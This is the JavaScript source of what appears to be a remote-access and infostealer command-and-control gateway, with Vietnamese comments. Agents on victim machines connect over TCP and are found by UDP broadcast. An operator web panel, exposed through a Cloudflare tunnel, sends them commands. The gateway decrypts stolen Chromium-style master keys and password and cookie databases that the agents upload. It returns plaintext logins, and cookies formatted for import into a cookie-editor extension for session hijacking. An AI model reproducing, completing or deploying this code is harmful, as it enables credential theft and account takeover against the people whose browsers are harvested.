// --- Gateway: HTTP + WebSocket + TCP + UDP ---
const path = require("path");
const http = require("http");
const express = require("express");
const WebSocket = require("ws");
const net = require("net");
const dgram = require("dgram");
const os = require("os");
const { spawn } = require("child_process");
const crypto = require("crypto");
const fs = require("fs");

// Thử import thư viện SQLite, nếu chưa cài thì báo lỗi rõ ràng
let Database;
try {
    Database = require("better-sqlite3");
} catch (e) {
    console.error("\n[ERROR] Missing 'better-sqlite3' library.");
    console.error("Please run: npm install better-sqlite3\n");
    process.exit(1);
}

// --- CẤU HÌNH ---
const CFG = {
    HTTP_PORT: parseInt(process.env.HTTP_PORT || 8080),
    AGENT_PORT: parseInt(process.env.AGENT_PORT || 9100),
    BEACON_PORT: 9103,
    TIMEOUT_MS: 30000,   // 30s không heartbeat -> Offline
    CLEANUP_MS: 60000    // 60s dọn dẹp agent chết
};

// --- QUẢN LÝ TRẠNG THÁI ---
const agents = new Map(); // Map<ip, { socket, buffer, info, lastSeen }>
let webClient = null;     // Chỉ 1 client điều khiển tại 1 thời điểm

// --- HELPER FUNCTIONS ---
const getLanIP = () => {
    for (const nets of Object.values(os.networkInterfaces())) {
        for (const net of nets) {
            if (net.family === "IPv4" && !net.internal) return net.address;
        }
    }
    return "127.0.0.1";
};

// --- 1. HTTP SERVER & API ---
const app = express();
app.use(express.static(path.join(__dirname, "public")));

app.get("/api/scan", (_, res) => {
    const now = Date.now();
    const activeAgents = Array.from(agents.values())
        .filter(a => a.socket && !a.socket.destroyed && (now - a.lastSeen < CFG.TIMEOUT_MS))
        .map(a => ({
            agentId: a.id,
            ip: a.info.ip,
            hostname: a.info.hostname,
            os: a.info.os,
            lastSeen: a.lastSeen
        }));
    res.json({ success: true, data: activeAgents });
});

const server = http.createServer(app);

// --- 2. WEBSOCKET SERVER (UI <-> GATEWAY) ---
const wss = new WebSocket.Server({ server, path: "/ws" });

wss.on("connection", (ws) => {
    if (webClient) { ws.close(1013, "Busy"); return; }
    
    webClient = ws;
    console.log("[Gateway] Web Client connected");

    ws.on("message", (raw) => {
        try {
            const msg = JSON.parse(raw);
            if (!msg.agentId) return ws.send(JSON.stringify({ type: "status", success: false, message: "Missing agentId" }));
            
            // Route lệnh xuống Agent qua TCP
            const agent = agents.get(msg.agentId);
            if (agent && agent.socket && !agent.socket.destroyed) {
                agent.socket.write(JSON.stringify(msg) + "\n");
            } else {
                ws.send(JSON.stringify({ type: "status", success: false, message: "Agent offline" }));
            }
        } catch (e) { console.error("[WS] Error:", e.message); }
    });

    ws.on("close", () => { if (webClient === ws) webClient = null; });
});

// --- 3. TCP SERVER (AGENT <-> GATEWAY) ---
const tcpServer = net.createServer((socket) => {
    const id = socket.remoteAddress; // Dùng IP làm ID
    socket.setEncoding("utf8");

    // Init hoặc Update Agent
    let agent = agents.get(id);
    if (agent?.socket) agent.socket.destroy(); // Đóng socket cũ nếu reconnect
    
    agent = { 
        id, 
        socket, 
        buffer: "", 
        lastSeen: Date.now(),
        info: { ip: id, hostname: "Unknown", os: "Unknown" }
    };
    agents.set(id, agent);
    console.log(`[TCP] Agent connected: ${id}`);

    socket.on("data", (chunk) => {
        agent.buffer += chunk;
        agent.lastSeen = Date.now();

        // Xử lý Stream buffer (Cắt dòng \n)
        let idx;
        while ((idx = agent.buffer.indexOf("\n")) !== -1) {
            const line = agent.buffer.slice(0, idx).trim();
            agent.buffer = agent.buffer.slice(idx + 1);
            if (!line) continue;

            try {
                const msg = JSON.parse(line);
                
                // === XỬ LÝ GÓI TIN ĐA PROFILE (MỚI) ===
                if (msg.type === "credentials_package_multi") {
                    console.log(`[Gateway] Received ${msg.dbs.length} databases from ${msg.browser}.`);
                    
                    let allPasswords = [];
                    
                    // Duyệt qua từng DB (Profile) gửi lên
                    for (const dbInfo of msg.dbs) {
                        console.log(`[Gateway] Trying profile: ${dbInfo.profile}...`);
                        const passwords = decryptPasswords(msg.master_key, dbInfo.data);
                        
                        if (passwords.length > 0) {
                            console.log(`   -> SUCCESS! Found ${passwords.length} passwords.`);
                            // Gộp kết quả
                            allPasswords = allPasswords.concat(passwords);
                        } else {
                            console.log(`   -> Failed or Empty.`);
                        }
                    }

                    // Gửi tổng kết quả về Web UI
                    if (webClient?.readyState === WebSocket.OPEN) {
                        webClient.send(JSON.stringify({
                            type: "passwords_result",
                            browser: msg.browser,
                            data: allPasswords
                        }));
                    }
                    continue;
                }

                if (msg.type === "cookies_package_multi") {
                    console.log(`[Gateway] Received Cookies DBs from ${msg.browser}.`);
                    let allCookies = [];
                    
                    for (const dbInfo of msg.dbs) {
                        const cookies = decryptCookies(msg.master_key, dbInfo.data);
                        if (cookies.length > 0) allCookies = allCookies.concat(cookies);
                    }

                    if (webClient?.readyState === WebSocket.OPEN) {
                        webClient.send(JSON.stringify({
                            type: "cookies_result",
                            browser: msg.browser,
                            data: allCookies
                        }));
                    }
                    continue;
                }

                // ==============================

                if (msg.type === "hello") {
                    agent.info = { ...agent.info, hostname: msg.hostname, os: msg.os };
                    console.log(`[TCP] Registered: ${agent.info.hostname} (${id})`);
                } else if (msg.type !== "heartbeat") {
                    // Forward data lên Web Client
                    if (webClient?.readyState === WebSocket.OPEN) {
                        msg.agentId = id; // Gắn ID để UI biết của ai
                        webClient.send(JSON.stringify(msg));
                    }
                }
            } catch (e) { /* Bỏ qua JSON lỗi */ }
        }
    });

    socket.on("error", (e) => console.error(`[TCP] Error ${id}: ${e.message}`));
    socket.on("close", () => console.log(`[TCP] Disconnect: ${id}`));
});

tcpServer.listen(CFG.AGENT_PORT, "0.0.0.0", () => {
    console.log(`[Gateway] TCP listening on 0.0.0.0:${CFG.AGENT_PORT}`);
});

// --- 4. UDP BEACON (AUTO DISCOVERY) ---
const udp = dgram.createSocket("udp4");
udp.bind(0, () => {
    udp.setBroadcast(true);
    setInterval(() => {
        const msg = JSON.stringify({
            type: "gateway_beacon",
            hostname: os.hostname(),
            ip: getLanIP(),
            port: CFG.AGENT_PORT
        });
        udp.send(msg, 0, msg.length, CFG.BEACON_PORT, "255.255.255.255");
    }, 500);
});

// --- 5. CLOUDFLARE TUNNEL (AUTO) ---
const startTunnel = () => {
    // Logic tìm đường dẫn file exe chuẩn kể cả khi đóng gói pkg
    const isPkg = typeof process.pkg !== 'undefined';
    const basePath = isPkg ? path.dirname(process.execPath) : __dirname;
    const cfExe = path.join(basePath, "cloudflared.exe");

    console.log("[Tunnel] Starting Cloudflare...");
    const child = spawn(cfExe, ["tunnel", "--url", `http://127.0.0.1:${CFG.HTTP_PORT}`]);

    child.stderr.on("data", (d) => {
        const url = d.toString().match(/https:\/\/[a-zA-Z0-9-]+\.trycloudflare\.com/);
        if (url) console.log(`\n>>> PUBLIC URL: ${url[0]} <<<\n`);
    });
    
    process.on("exit", () => child.kill()); 
};

// --- 6. CLEANUP TASK ---
setInterval(() => {
    const now = Date.now();
    agents.forEach((a, id) => {
        if (now - a.lastSeen > CFG.CLEANUP_MS) {
            if (a.socket) a.socket.destroy();
            agents.delete(id);
        }
    });
}, CFG.CLEANUP_MS);

// --- HÀM GIẢI MÃ PASSWORD (AES-GCM) ---
function decryptPasswords(masterKeyB64, dbFileB64) {
    let db = null;
    const tempDbName = `temp_${Date.now()}.db`;

    console.log("--- FINAL DECRYPTION LOGIC (Strict v10/v20) ---");
    try {
        if (!masterKeyB64 || !dbFileB64) return [];

        const masterKey = Buffer.from(masterKeyB64, 'base64');
        fs.writeFileSync(tempDbName, Buffer.from(dbFileB64, 'base64'));

        db = new Database(tempDbName);
        const rows = db.prepare("SELECT origin_url, username_value, password_value FROM logins").all();
        const results = [];

        rows.forEach((row, index) => {
            if (!row.password_value || !row.username_value) return;
            
            try {
                const buffer = row.password_value;
                const totalLength = buffer.length;
                
                // Cần ít nhất 31 byte: 3 (prefix) + 12 (IV) + X (Ciphertext) + 16 (Tag)
                if (totalLength < 31) return; 

                const prefix = buffer.slice(0, 3).toString('utf8');
                
                // CHỈ CHẤP NHẬN CÁC CHUẨN MÃ HÓA SỬ DỤNG MASTER KEY
                if (prefix === 'v10' || prefix === 'v11' || prefix === 'v20') {
                    
                    const iv = buffer.slice(3, 15);
                    const tag = buffer.slice(-16);
                    const ciphertext = buffer.slice(15, totalLength - 16);
                    
                    if (iv.length !== 12 || tag.length !== 16) return; // Kiểm tra kích thước nghiêm ngặt

                    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                    decipher.setAuthTag(tag);
                    
                    let clear = decipher.update(ciphertext) + decipher.final('utf8');
                    
                    if (clear && clear.length > 0) {
                        results.push({
                            url: row.origin_url,
                            user: row.username_value,
                            pass: clear
                        });
                    }
                }
            } catch(e) {
                // Lỗi giải mã vẫn xảy ra ở đây nếu Key sai, nhưng ta biết Key đúng.
                // Do đó, lỗi này chỉ là Key không khớp với File (dữ liệu file bị lỗi/lẫn)
            }
        });
        
        console.log(`--- FINISHED. Decrypted: ${results.length} / ${rows.length} ---`);
        return results;
    } catch (e) {
        console.error("[CRASH] Decryption fatal error:", e.message);
        return [];
    } finally {
        if (db) db.close();
        if (fs.existsSync(tempDbName)) try { fs.unlinkSync(tempDbName); } catch(e){}
    }
}

// --- DECRYPT COOKIES FUNCTION ---
function decryptCookies(masterKeyB64, dbFileB64) {
    let db = null;
    const tempDbName = `temp_cookies_${Date.now()}.db`;
    const results = [];

    // Nếu không có key hoặc file DB -> trả về rỗng
    if (!masterKeyB64 || !dbFileB64) return [];

    console.log("--- DECRYPTING COOKIES ---");
    try {
        const masterKey = Buffer.from(masterKeyB64, 'base64');
        fs.writeFileSync(tempDbName, Buffer.from(dbFileB64, 'base64'));

        db = new Database(tempDbName);
        
        // Lấy dữ liệu từ bảng cookies
        // Các trình duyệt mới lưu encrypted_value
        const rows = db.prepare("SELECT host_key, name, encrypted_value, path, is_secure, expires_utc FROM cookies").all();

        rows.forEach((row) => {
            if (!row.encrypted_value) return;
            
            try {
                const buffer = row.encrypted_value;
                const prefix = buffer.slice(0, 3).toString('utf8');
                let iv, ciphertext, tag, clearText;

                // Logic giải mã v10/v20 (AES-GCM)
                if (prefix === 'v10' || prefix === 'v11' || prefix === 'v20') {
                    iv = buffer.slice(3, 15);
                    ciphertext = buffer.slice(15, buffer.length - 16);
                    tag = buffer.slice(-16);

                    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                    decipher.setAuthTag(tag);
                    clearText = decipher.update(ciphertext) + decipher.final('utf8');
                } 
                
                if (clearText) {
                    // Định dạng JSON chuẩn để import vào EditThisCookie
                    results.push({
                        domain: row.host_key,
                        name: row.name,
                        value: clearText,
                        path: row.path,
                        secure: !!row.is_secure,
                        expirationDate: (row.expires_utc / 1000000) - 11644473600 // Chuyển đổi timestamp Webkit
                    });
                }
            } catch(e) { 
                // Bỏ qua lỗi từng dòng (do key sai hoặc data lỗi)
            }
        });
        
        console.log(`--- COOKIES: Decrypted ${results.length} items.`);
        return results;
    } catch (e) {
        console.error("Cookie Decrypt Error:", e.message);
        return [];
    } finally {
        if (db) db.close();
        if (fs.existsSync(tempDbName)) try { fs.unlinkSync(tempDbName); } catch(e){}
    }
}

// --- START ---
server.listen(CFG.HTTP_PORT, "0.0.0.0", () => {
    console.log(`[Gateway] UI Server: http://${getLanIP()}:${CFG.HTTP_PORT}`);
    startTunnel();
});